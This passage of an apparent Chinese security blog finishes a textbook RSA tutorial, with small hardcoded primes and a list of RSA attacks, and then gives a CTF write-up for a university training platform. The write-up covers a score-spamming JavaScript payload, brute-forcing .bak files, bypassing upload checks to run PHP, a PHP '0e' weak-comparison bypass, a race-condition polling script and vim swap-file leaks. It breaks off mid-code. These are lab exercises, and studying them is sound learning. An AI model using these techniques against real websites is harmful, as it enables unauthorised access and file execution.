&gt;&gt;= <span class=\"number\">1</span></span><br><span class=\"line\">        b = (b*b) % m</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加密函数,输入为plain字符明文，n，e</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rsa_encrypt</span><span class=\"params\">(plain)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">global</span> n</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> e</span><br><span class=\"line\">\t<span class=\"comment\"># 将明文转为比特串</span></span><br><span class=\"line\">\tbitplian = str2bin(plain)</span><br><span class=\"line\">\tgroup_len = int(math.log(n,<span class=\"number\">2</span>)) - <span class=\"number\">1</span> </span><br><span class=\"line\">\tarr_group = []</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (len(bitplian) % group_len) != <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tbitplian += <span class=\"string\">\"0\"</span>*(group_len-(len(bitplian) % group_len))</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(bitplian) // group_len):</span><br><span class=\"line\">\t\tarr_group.append(bitplian[i*group_len:i*group_len+group_len])</span><br><span class=\"line\">\tcipher = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> arr_group:</span><br><span class=\"line\">\t\tci = fastExpMod(int(item,<span class=\"number\">2</span>),e,n)</span><br><span class=\"line\">\t\tcipher += <span class=\"string\">f'<span class=\"subst\">&#123;bin(ci)[<span class=\"number\">2</span>:]:<span class=\"number\">0</span>&gt;&#123;group_len+<span class=\"number\">2</span>&#125;</span>&#125;'</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> hex(int(cipher,<span class=\"number\">2</span>))[<span class=\"number\">2</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 解密函数，输入为cipehr16进制密文，n，d</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rsa_decrypt</span><span class=\"params\">(cipher)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">global</span> n</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> d</span><br><span class=\"line\">\tbitcipher = bin(int(cipher,<span class=\"number\">16</span>))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">\ttemp_len = int(math.log(n,<span class=\"number\">2</span>)) + <span class=\"number\">1</span> </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (len(bitcipher) % temp_len) != <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tbitcipher = <span class=\"string\">\"0\"</span>*(temp_len - (len(bitcipher) % temp_len)) + bitcipher</span><br><span class=\"line\">\tgroup_len = int(math.log(n,<span class=\"number\">2</span>)) + <span class=\"number\">1</span></span><br><span class=\"line\">\tarr_group = []</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(bitcipher) // group_len):</span><br><span class=\"line\">\t\tarr_group.append(bitcipher[i*group_len:i*group_len+group_len])</span><br><span class=\"line\">\tbitplain = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> arr_group:</span><br><span class=\"line\">\t\t<span class=\"comment\"># mi = (int(item,2)**d % n)</span></span><br><span class=\"line\">\t\tmi = fastExpMod(int(item,<span class=\"number\">2</span>),d,n)</span><br><span class=\"line\">\t\tbitplain += <span class=\"string\">f'<span class=\"subst\">&#123;bin(mi)[<span class=\"number\">2</span>:]:<span class=\"number\">0</span>&gt;&#123;group_len<span class=\"number\">-2</span>&#125;</span>&#125;'</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> bin2str(bitplain)</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"number\">2147483647</span></span><br><span class=\"line\">q = <span class=\"number\">1000000007</span></span><br><span class=\"line\">n = p * q</span><br><span class=\"line\">pi_n = (p<span class=\"number\">-1</span>) * (q<span class=\"number\">-1</span>)</span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\">d = int(gp.invert(e,pi_n))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">\tmode = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> mode == <span class=\"string\">'e'</span>:</span><br><span class=\"line\">\t\tplain = input(<span class=\"string\">\"Plz input message: \"</span>)</span><br><span class=\"line\">\t\tcipher = rsa_encrypt(plain)</span><br><span class=\"line\">\t\tprint(<span class=\"string\">\"cipher: \"</span>, cipher)</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> mode == <span class=\"string\">'d'</span>:</span><br><span class=\"line\">\t\tcipher = input(<span class=\"string\">\"Plz input cipher: \"</span>)</span><br><span class=\"line\">\t\tplain = rsa_decrypt(cipher)</span><br><span class=\"line\">\t\tprint(<span class=\"string\">\"plain: \"</span>,plain)</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n<p><strong>实例演示：</strong></p>\n<p><img src=\"/2019/01/15/crypto2/2.png\" alt=\"demo\"></p>\n<p><strong>安全性分析</strong></p>\n<p>​    到目前为止，世界上还没有任何可靠的攻击RSA算法的方式 。然而即便RSA算法目前来说是安全可靠的，<strong>但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题</strong>，从而也派生出针对各种特定场景下的RSA攻击方法。 此处指简单列举一些攻击方法</p>\n<ul>\n<li><p>直接分解n。一般这种情况是由于n较小，或者使用已经使用过的p、q造成的，这样会造成RSA直接被破解</p>\n</li>\n<li><p>低加密指数攻击。当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 </p>\n<p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p>\n<p>即：</p>\n</li>\n</ul>\n<blockquote>\n<script type=\"math/tex; mode=display\">cequiv m^e mod n</script></blockquote>\n<p>  如果e=3，且$ m^e&lt;{n} $，那么：</p>\n<blockquote>\n<p>​                        $ c= m^e,$ $e=3$</p>\n<p> ​                        $ m=sqrt[3]{c}$</p>\n</blockquote>\n<p>  如果明文的三次方比n大，但是不是足够大，那么设k，有：</p>\n<p>  ​                        $ c= m^e+kn$</p>\n<p>  爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。</p>\n<ul>\n<li><p>低加密指数广播攻击。如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 </p>\n<p>即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有：</p>\n<p>​                        $ c_1equiv m^e$ $mod$ $n_1$</p>\n<p>​                        $ c_2equiv m^e$ $mod$ $n_2$</p>\n<p>​                        $ c_3equiv m^e$ $mod$ $n_3$</p>\n<p>对上述等式运用中国剩余定理，在e=3时，可以得到：</p>\n<p>​                        $ c_xequiv m^3$ $mod$ $n_1n_2n_3$</p>\n<p>通过对$ c_x $进行三次开方可以求得明文。</p>\n</li>\n<li><p>公模攻击。如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。</p>\n<p>即：</p>\n<p>​                        $ c_1equiv m^{e_1}$ $mod$ $n$</p>\n<p>​                        $ c_2equiv m^{e_2}$ $mod$ $n$</p>\n<p>此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。</p>\n</li>\n</ul>\n<hr>\n<p>​    由于RSA良好的安全性，RSA可用来电子签名中来确认通信双方身份。</p>\n<hr>\n<p>通过对RSA的分析可知，RSA的安全性是基于大数的难分解性的，所以应尽可能选择足够大的p、q，目前大素数的产生依然是一个世界难题，这里展示一个素性判断算法miller-rabin算法，可以利用此算法判断一个数是不是素数从而穷举产生大素数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> randint</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">xn_mod_p2</span><span class=\"params\">(x, n, p)</span>:</span></span><br><span class=\"line\">  res = <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"comment\"># n_bin = bin(n)[2:]</span></span><br><span class=\"line\">  n_bin = bin(int(n))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(n_bin)):</span><br><span class=\"line\">    res = res**<span class=\"number\">2</span> % p</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n_bin[i] == <span class=\"string\">'1'</span>:</span><br><span class=\"line\">      res = res * x % p</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">miller_rabin_witness</span><span class=\"params\">(a, p)</span>:</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> p == <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> p == <span class=\"number\">2</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">  <span class=\"comment\">#p-1 = u*2^t 求解 u, t</span></span><br><span class=\"line\">  n = p - <span class=\"number\">1</span></span><br><span class=\"line\">  t = int(math.floor(math.log(n, <span class=\"number\">2</span>)))</span><br><span class=\"line\">  u = <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> t &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">    u = n / <span class=\"number\">2</span>**t</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n % <span class=\"number\">2</span>**t == <span class=\"number\">0</span> <span class=\"keyword\">and</span> u % <span class=\"number\">2</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    t = t - <span class=\"number\">1</span></span><br><span class=\"line\">  b1 = b2 = xn_mod_p2(a, u, p)</span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, t + <span class=\"number\">1</span>):</span><br><span class=\"line\">    b2 = b1**<span class=\"number\">2</span> % p</span><br><span class=\"line\">    <span class=\"keyword\">if</span> b2 == <span class=\"number\">1</span> <span class=\"keyword\">and</span> b1 != <span class=\"number\">1</span> <span class=\"keyword\">and</span> b1 != (p - <span class=\"number\">1</span>):</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    b1 = b2</span><br><span class=\"line\">  <span class=\"keyword\">if</span> b1 != <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">prime_test_miller_rabin</span><span class=\"params\">(p, k)</span>:</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> k &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">    a = randint(<span class=\"number\">1</span>, p - <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> miller_rabin_witness(a, p):</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    k = k - <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">num = input(<span class=\"string\">u\"请输入要进行Miller-Rabin算法检测的数：\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> prime_test_miller_rabin(int(num),<span class=\"number\">10</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">print</span> (<span class=\"string\">u\"&#123;0&#125;大概率是素数\"</span>.format(num))</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">print</span> (<span class=\"string\">u\"&#123;0&#125;是合数 \"</span>.format(num))</span><br></pre></td></tr></table></figure>\n<p><strong>实例演示：</strong></p>\n<p><img src=\"/2019/01/15/crypto2/3.png\" alt=\"demo\"></p>\n<h1 id=\"通信过程模拟\"><a href=\"#通信过程模拟\" class=\"headerlink\" title=\"通信过程模拟\"></a>通信过程模拟</h1><p>​    有了前面的算法基础，我们现在可以模拟出一个从Alice到Bob的通信过程，步骤如下:</p>\n<p><img src=\"/2019/01/15/crypto2/4.png\" alt=\"demo\"></p>\n<p>​    接下来用代码详细模拟了一下该过程</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> rsa</span><br><span class=\"line\"><span class=\"keyword\">import</span> md5</span><br><span class=\"line\"><span class=\"keyword\">import</span> des</span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">\"现在开始模拟Alice到Bob之间的通信过程：\"</span>)</span><br><span class=\"line\">print()</span><br><span class=\"line\">print(<span class=\"string\">'*******Alice的发送准备*********'</span>)</span><br><span class=\"line\">print()</span><br><span class=\"line\">message = <span class=\"string\">\"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设定message哈希值</span></span><br><span class=\"line\">message_hash = md5.encrypt(message)</span><br><span class=\"line\">sign = rsa.rsa_encrypt(message_hash)</span><br><span class=\"line\">key = <span class=\"string\">\"infosecu\"</span></span><br><span class=\"line\">print(<span class=\"string\">\"Alice想要发送到明文信息: \"</span>,message)</span><br><span class=\"line\">print(<span class=\"string\">\"Alice的DES秘钥：\"</span>, key)</span><br><span class=\"line\">print(<span class=\"string\">\"消息哈希(用于检验消息完整性): \"</span>,message_hash)</span><br><span class=\"line\">print(<span class=\"string\">\"Alice签名: \"</span>, sign)</span><br><span class=\"line\"></span><br><span class=\"line\">print()</span><br><span class=\"line\">print(<span class=\"string\">'公开信道上传输DES加密数据'</span>)</span><br><span class=\"line\">print()</span><br><span class=\"line\">print(<span class=\"string\">'*******sending...**********'</span>)</span><br><span class=\"line\">print()</span><br><span class=\"line\">send_mess = des.encrypt(message,key)</span><br><span class=\"line\">send_sign = des.encrypt(sign,key)</span><br><span class=\"line\">print(<span class=\"string\">\"message: \"</span>,send_mess)</span><br><span class=\"line\">print(<span class=\"string\">\"sign: \"</span>,send_sign)</span><br><span class=\"line\">print(<span class=\"string\">\"message_hash: \"</span>,message_hash)</span><br><span class=\"line\">print()</span><br><span class=\"line\">print(<span class=\"string\">'********sending finish*******'</span>)</span><br><span class=\"line\">print()</span><br><span class=\"line\">print()</span><br><span class=\"line\">print(<span class=\"string\">\"********Bob处理收到的信息********\"</span>)</span><br><span class=\"line\">print()</span><br><span class=\"line\">print(<span class=\"string\">\"DES解密对应的内容：\"</span>)</span><br><span class=\"line\">b_sign = des.decrypt(send_sign,key)</span><br><span class=\"line\">b_mess = des.decrypt(send_mess,key)</span><br><span class=\"line\">print(<span class=\"string\">\"Alice发送的明文message： \"</span>,b_mess)</span><br><span class=\"line\">print(<span class=\"string\">\"消息签名sign： \"</span>,b_sign)</span><br><span class=\"line\">print()</span><br><span class=\"line\">b_mess_hash = md5.encrypt(message)</span><br><span class=\"line\">print(<span class=\"string\">\"此时Bob自己求出明文哈希值： \"</span>, b_mess_hash)</span><br><span class=\"line\">print(<span class=\"string\">\"之后与Alice发送的消息哈希进行校验\"</span>)</span><br><span class=\"line\">print(<span class=\"string\">\"...****....\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">print(b_mess_hash,<span class=\"string\">\"==\"</span>,message_hash,<span class=\"string\">\"消息在传输过程中没有出错! 但是无法确定是否是Alice所发。\"</span>)</span><br><span class=\"line\">print()</span><br><span class=\"line\"></span><br><span class=\"line\">vert = rsa.rsa_decrypt(sign)</span><br><span class=\"line\">print(<span class=\"string\">\"Bob对签名进行RSA解密： \"</span>,vert)</span><br><span class=\"line\">print(<span class=\"string\">\"对解密后的签名值与自己计算出的MD5值相比较来验证发送方身份..\"</span>)</span><br><span class=\"line\">print(<span class=\"string\">\"verting.....\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> vert == b_mess_hash:</span><br><span class=\"line\">\tprint(<span class=\"string\">\"message is ok. 此时Bob可以确认从Alice处收到了完整的信息。\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tprint(<span class=\"string\">\"message is broken.\"</span>)</span><br><span class=\"line\">print()</span><br><span class=\"line\">print(<span class=\"string\">\"通信过程完成，Bob收到了Alice的信息！\"</span>)</span><br></pre></td></tr></table></figure>\n<p><strong>实例演示：</strong></p>\n<p><img src=\"/2019/01/15/crypto2/5.png\" alt=\"demo\"></p>\n","categories":["Record"],"tags":["Crypto"]},{"title":"CUMT网络安全实训平台题目记录","url":"/2018/12/07/cumtctf/","content":"<p>CUMT网络安全实训平台题目记录</p>\n<a id=\"more\"></a>\n<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"源代码\"><a href=\"#源代码\" class=\"headerlink\" title=\"源代码\"></a>源代码</h2><p>查看源代码，在最后发现一段字符</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!--该f配l合a你g演&#123;出y的o我u演f视i而n不d见m别e逼2一3个3最3爱3你3的3人3即3兴3表3演&#125;--&gt;</span><br></pre></td></tr></table></figure>\n<p>提取出字符即可得到flag</p>\n<h2 id=\"colorSnake\"><a href=\"#colorSnake\" class=\"headerlink\" title=\"colorSnake\"></a>colorSnake</h2><p>前端题目，一头雾水，看了别人的wp，查看源代码在页面地段可以看到有一个game.js，跟过去看一下，</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">xhr(<span class=\"string\">'./getScore.php'</span>,function(e)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> r = JSON.parse(e);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(r.state == <span class=\"number\">200</span>)</span><br><span class=\"line\">                    game.addScore(r.score);</span><br><span class=\"line\">                <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                    alert(r.msg);</span><br><span class=\"line\">                    game.start()</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;)</span><br></pre></td></tr></table></figure>\n<p>尝试在控制台提交</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">setInterval(function()&#123;xhr(&#39;.&#x2F;getScore.php&#39;,function(e)&#123;</span><br><span class=\"line\">                var r &#x3D; JSON.parse(e);</span><br><span class=\"line\">                if(r.state &#x3D;&#x3D; 200)</span><br><span class=\"line\">                    game.addScore(r.score);</span><br><span class=\"line\">                else&#123;</span><br><span class=\"line\">                    alert(r.msg);</span><br><span class=\"line\">                    game.start()</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;)&#125;,1)</span><br></pre></td></tr></table></figure>\n<p>会发现id确实增加了，我们可以通过修改参数使它实现多次递增从而达到50分，最终payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">setInterval(function()&#123;xhr(&#39;.&#x2F;getScore.php&#39;,function(e)&#123;</span><br><span class=\"line\">                var r &#x3D; JSON.parse(e);</span><br><span class=\"line\">                if(r.state &#x3D;&#x3D; 200)</span><br><span class=\"line\">                    game.addScore(r.score);</span><br><span class=\"line\">                else&#123;</span><br><span class=\"line\">                    alert(r.msg);</span><br><span class=\"line\">                    game.start()</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;)&#125;,1000)</span><br></pre></td></tr></table></figure>\n<h2 id=\"备份\"><a href=\"#备份\" class=\"headerlink\" title=\"备份\"></a>备份</h2><p>题目给出了信息</p>\n<blockquote>\n<p>1.bak 2.bak There are too much baks in the website ,can you find the flag in these baks?</p>\n</blockquote>\n<p>尝试访问1.bak，2.bak，没有发现flag，继续访问3.bak，4.bak等都存在文件，只是没有flag，猜测flag应该在某个*.bak，中，bp爆破一下，在998.bak中发现了flag</p>\n<h2 id=\"上传一\"><a href=\"#上传一\" class=\"headerlink\" title=\"上传一\"></a>上传一</h2><p>题目要求上传jpg后缀，写一个PHP文件修改后缀为jpg，之后抓包修改文件名后缀为PHP再发包（因为它是在前端验证文件是否合法）</p>\n<p><img src=\"/2018/12/07/cumtctf/2.png\" alt=\"payload\"></p>\n<p>之后就可以惊喜的看到本题的flag和下个“上传2”题目的flag（2333..）</p>\n<p><img src=\"/2018/12/07/cumtctf/3.png\" alt=\"result\"></p>\n<h2 id=\"自动获取flag程序\"><a href=\"#自动获取flag程序\" class=\"headerlink\" title=\"自动获取flag程序\"></a>自动获取flag程序</h2><p>题目说了要修改一下程序，查看源代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 请求参数一</span></span><br><span class=\"line\">$(<span class=\"string\">\"#a\"</span>).click(function()&#123;</span><br><span class=\"line\">    $.ajax(&#123;</span><br><span class=\"line\">        url:<span class=\"string\">'param1.php'</span>,</span><br><span class=\"line\">        method:<span class=\"string\">'get'</span>,</span><br><span class=\"line\">        dataType:<span class=\"string\">'json'</span>,</span><br><span class=\"line\">        success:calParam2</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"function\">function <span class=\"title\">calParam2</span><span class=\"params\">(d)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> data=JSON.parse((d.param));</span><br><span class=\"line\">    <span class=\"keyword\">var</span> length=data.length;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> second=<span class=\"keyword\">new</span> Date().getSeconds();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> sum=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">1</span>; i &lt; length; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> j = <span class=\"number\">0</span>; j &lt; length/<span class=\"number\">2</span>; j++) &#123;</span><br><span class=\"line\">            sum+=parseInt(data[i])*second + data[j];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 请求flag</span></span><br><span class=\"line\">    $.ajax(&#123;</span><br><span class=\"line\">        url:<span class=\"string\">'http://new.ctf.param.com/aram2.php?sum='</span>+sum,</span><br><span class=\"line\">        method:<span class=\"string\">'get'</span>,</span><br><span class=\"line\">        dataType:<span class=\"string\">'json'</span>,</span><br><span class=\"line\">        success:function(s)&#123;</span><br><span class=\"line\">            alert(s.f);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        error:function(s)&#123;</span><br><span class=\"line\">            alert(<span class=\"string\">'错了'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看到有个param1.php的请求，访问一下得到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;param&quot;:&quot;[&quot;1&quot;,&quot;6&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;9&quot;,&quot;1&quot;,&quot;10&quot;]&quot;&#125;</span><br></pre></td></tr></table></figure>\n<!-- flag{hello,This is A Gift FoRm PHP&JS; O(∩_∩)O~} -->\n<h2 id=\"Cookie？\"><a href=\"#Cookie？\" class=\"headerlink\" title=\"Cookie？\"></a>Cookie？</h2><p>查看cookie发现user值为guest，改为admin再刷新即可</p>\n<p><img src=\"/2018/12/07/cumtctf/5.png\" alt=\"result\"></p>\n<p>一看就是维吉尼亚密码，解密一下就可以了</p>\n<!-- flag{thisisanoldencrypt}<-->\n<h2 id=\"上传二\"><a href=\"#上传二\" class=\"headerlink\" title=\"上传二\"></a>上传二</h2><p>见上传一</p>\n<h2 id=\"logic\"><a href=\"#logic\" class=\"headerlink\" title=\"logic\"></a>logic</h2><p>查看源代码可以发现</p>\n<p><img src=\"/2018/12/07/cumtctf/1.png\" alt></p>\n<p>应该是存在vim泄漏，尝试访问 <code>submit.php.swp</code> 发现泄漏文件，关键代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($token)&amp;&amp;!<span class=\"keyword\">empty</span>($emailAddress))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(strlen($token)!=<span class=\"number\">10</span>) <span class=\"keyword\">die</span>(<span class=\"string\">'fail'</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($token!=<span class=\"string\">'0'</span>) <span class=\"keyword\">die</span>(<span class=\"string\">'fail'</span>);</span><br><span class=\"line\">\t$sql = <span class=\"string\">\"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"</span>;</span><br><span class=\"line\">\t$r = mysql_query($sql) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">'db error'</span>);</span><br><span class=\"line\">\t$r = mysql_fetch_assoc($r);</span><br><span class=\"line\">\t$r = $r[<span class=\"string\">'num'</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($r&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"失败了呀\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题目一看就是很简单的弱比较，但是提交之后却无法正常回显，而是返回you are not admin，再看上图，admin应该就是chengyurui，所以邮箱为 <code>chenyurui@gmail.com</code> ，再提交一个<code>0e12345678</code> 即可。</p>\n<h2 id=\"上传三\"><a href=\"#上传三\" class=\"headerlink\" title=\"上传三\"></a>上传三</h2><p>bp抓包尝试不同的后缀，尝试 <code>phtml</code> 发现可以上传成功，即上传 <code>snow.phtml</code> ，题目返回信息</p>\n<p><img src=\"/2018/12/07/cumtctf/6.png\" alt></p>\n<p>可以看到我们的文件已经上传成功了(文件被执行了)，只是被后台查杀了，这就说明我们可以利用条件竞争来做这道题</p>\n<p>用burpsuite连续发包，在写个代码连续读取</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">url = <span class=\"string\">\"http://202.119.201.199/challenge/web/uploadfile/upload/snow.phtml\"</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\tcontent = requests.get(url).text</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">\"flag\"</span> <span class=\"keyword\">in</span> content:</span><br><span class=\"line\">\t\tprint(content)</span><br></pre></td></tr></table></figure>\n<p>然后即可读到flag</p>\n<!--flag{$$$_YOU_ARE_THE_BEST_GUY_HEIHEI_$$$}-->\n<h2 id=\"is-hash-safe\"><a href=\"#is-hash-safe\" class=\"headerlink\" title=\"is hash safe??\"></a>is hash safe??</h2><p>题目给出了提示，应该是文件泄露，发现admin.php.swp存在，下载之，在linux下输入命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim -r amdin.php.swp</span><br></pre></td></tr></table></figure>\n<p>即可恢复出源代码，核心代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$auth = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">$role = <span class=\"string\">\"guest\"</span>;</span><br><span class=\"line\">$salt =<span class=\"string\">\"xxxxxxxxxxxxx\"</span>;<span class=\"comment\">//len:13</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">\"role\"</span>])) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        $role = $_COOKIE[<span class=\"string\">\"role\"</span>];</span><br><span class=\"line\">        $hsh = $_COOKIE[<span class=\"string\">\"hsh\"</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (stripos($role,<span class=\"string\">\"admin\"</span>)!==<span class=\"keyword\">false</span>&amp;&amp;$hsh === md5($salt.$_COOKIE[<span class=\"string\">\"role\"</span>])) </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                $auth = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                $auth = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span 